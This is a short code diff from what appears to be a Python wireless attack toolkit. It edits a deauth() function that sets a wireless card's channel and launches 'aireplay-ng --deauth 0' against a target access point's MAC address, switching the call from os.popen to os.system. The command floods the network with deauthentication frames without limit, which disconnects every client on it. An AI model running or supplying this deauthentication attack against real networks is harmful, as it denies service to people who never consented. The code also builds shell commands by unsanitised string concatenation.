@@ -316,7 +316,8 @@ def deauth():
     com = "iwconfig " + interface + " " +" channel " + channel
     pr = os.popen(com)
     command = "aireplay-ng --deauth  0 -a "+ mac + " " + interface 
-    process = os.popen(command)
+    os.system(command)
+
 def netscanterm():
     print ga.yellow
     os.system("clear")
